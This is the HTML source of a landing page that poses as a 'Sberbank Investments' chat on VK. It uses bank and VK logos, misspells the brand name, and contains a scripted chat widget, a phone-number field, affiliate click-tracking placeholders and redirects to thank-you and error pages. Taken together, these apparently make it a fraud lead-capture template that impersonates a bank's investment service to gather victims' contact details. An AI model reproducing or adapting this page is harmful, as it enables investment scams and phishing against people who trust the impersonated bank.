<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Сберабанк инвестиции | VK</title>
    <link
      type="image/x-icon"
      rel="shortcut icon"
      href="/assets/images2/logo.png"
    />
    <link rel="stylesheet" href="/styles/styles.css" />
    <link rel="stylesheet" href="/styles/form.css" />
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap"
      rel="stylesheet"
    />
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/18.3.3/css/intlTelInput.css"
    />
    <script type="text/javascript">
      var php_var = {
        rule_name: "{rule_name}",
        traffic_source_name: "{traffic_source_name}",
        landing_name: "{landing_name}",
        sub1: "{clickid}",
        bge_pix: "{t10}",
        campaing_id: "1484",
      };
      window.bgdataLayer = window.bgdataLayer || [];
      function bge() {
        bgdataLayer.push(arguments);
      }
      function trackPageView() {
        bge("init", "{t10}");
        bge("page_view", "{t10}");
      }
      function bge_ec_register() {
        bge("event", "ec_register", { configId: "{t10}" });
      }
    </script>
    <style>
      .pageloader {
        position: fixed;
        left: 0px;
        top: 0px;
        width: 100%;
        height: 100%;
        z-index: 9999;
        background: url("/assets/images2/loader.gif") 50% 50% no-repeat
          rgb(249, 249, 249);
        opacity: 0.8;
      }
    </style>
  </head>

  <body>
    <div class="pageloader"></div>
    <div id="app" class="app-wrapper themed">
      <header class="content-wrapper header">
        <div class="content-container">
          <div class="content">
            <div class="header__top">
              <a href="#"
                ><img src="/assets/images/logo_vk.svg" alt="" class="logo_vk"
              /></a>
            </div>
            <div class="header__main">
              <a href="#"><img src="/assets/images/back-icon.svg" alt="" /></a>
              <div class="header__center">
                <a href=""><img src="/assets/images/logo_sber.svg" alt="" /></a>
                <div>
                  <p>Сбербанк Инвенстиции</p>
                  <span>онлайн</span>
                </div>
              </div>
              <a href="#"><img src="/assets/images/phone.svg" alt="" /></a>
            </div>
          </div>
        </div>
      </header>

      <main class="main-wrapper main">
        <section class="content-wrapper">
          <div class="content-container">
            <div class="content">
              <div class="chat_date">
                <span>Сегодня</span>
              </div>
              <div id="chat" class="chat-main">
                <div id="typing_loader" class="chat-main__user d-none">
                  <img
                    src="/assets/images/avatar.svg"
                    alt=""
                    class="chat-main__avatar"
                  />
                  <div class="chat-main__loader">
                    <span class="chat-main__dot"></span>
                    <span class="chat-main__dot"></span>
                    <span class="chat-main__dot"></span>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </section>
      </main>

      <footer class="content-wrapper footer">
        <div class="content-container">
          <div class="content">
            <div class="footer-panel">
              <a href="#"><img src="/assets/images/add_circle.svg" alt="" /></a>
              <input type="text" placeholder="Сообщение" />
              <a href="#"><img src="/assets/images/smile.svg" alt="" /></a>
              <a href="#"><img src="/assets/images/voice.svg" alt="" /></a>
            </div>
          </div>
        </div>
      </footer>
    </div>
    <div class="scripts-wrapper">
      <script src="/js/chatengine.js"></script>
      <div class="scroll-block"></div>
    </div>

    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/2.1.4/toastr.css"
    />
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/2.1.4/toastr.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/18.3.3/js/intlTelInput.min.js"></script>
    <script src="/js/mailcheck.min.js"></script>
    <script src="/js/script.js"></script>
    <script>
      window.addEventListener("pageshow", function () {
        var err = localStorage.getItem("unsuitable");
        var thx = localStorage.getItem("thanks");
        if (err && err === "false") {
          const fileErr = "err.html";
          window.location.href = `${fileErr}${window.location.search}`;
        } else if (thx && thx === "true") {
          const fileThx = "thanks.html";
          window.location.href = `${fileThx}${window.location.search}`;
        }
      });
      $(".pageloader").hide();
      // Вызов функции для отслеживания просмотра страницы
      trackPageView();
    </script>
  </body>
</html>
